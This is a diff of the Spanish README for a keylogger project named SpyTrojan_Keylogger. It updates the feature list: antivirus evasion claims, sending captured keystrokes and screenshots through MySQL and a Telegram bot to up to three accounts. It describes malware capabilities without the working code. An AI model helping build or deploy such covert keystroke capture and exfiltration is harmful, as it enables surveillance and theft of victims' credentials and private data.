@@ -38,8 +38,8 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 * from PIL import ImageGrab       # Toma capturas de pantall
 ---
 # Caracteristicas
-- __Indetectable Antivirus:__ Windows Defender `26/05/2020`, Avast, ESET NOD32
-- __Envío por DB_MYSQL:__ Se enviarán los datos del registro mediante una base de datos MySQL, más información [Aquí](https://github.com/SebastianEPH/SpyTrojan_Keylogger#env%C3%ADo-mediante-base-de-datos-mysql)
+- __Indetectable Antivirus:__ Solo para: Windows Defender `02/07/2020`, Avast, ESET NOD32
+- __Envío por DB_MYSQL:__ Envio de de datos mediante una base de datos MySQL, más información [Aquí](https://github.com/SebastianEPH/SpyTrojan_Keylogger#env%C3%ADo-mediante-base-de-datos-mysql)
 
     ![DataBase key](https://i.imgur.com/axhHVlF.png)
 
@@ -75,8 +75,8 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 
 
 
-- __Envio mediante Bot Telegram:__ Soporte de envio automatico del registro de teclas a un bot especifico. [Más información aquí](#)
-- __Screenshot:__ Toma capturas de pantalla con un intervalo personalizado [Solo valido para Telegram]
+- __Envio mediante Bot Telegram:__ Soporte de envio automatico del registro de teclas a un bot especifico. Nota: puedes enviar el registro de teclas simultaneamente a 3 cuentas distintas
+- __Screenshot:__ Toma capturas de pantalla con un intervalo personalizado [Solo valido para Telegram] [hasta 3 cuentas]
 
     ![](https://i.imgur.com/NpNzd4b.png)
 
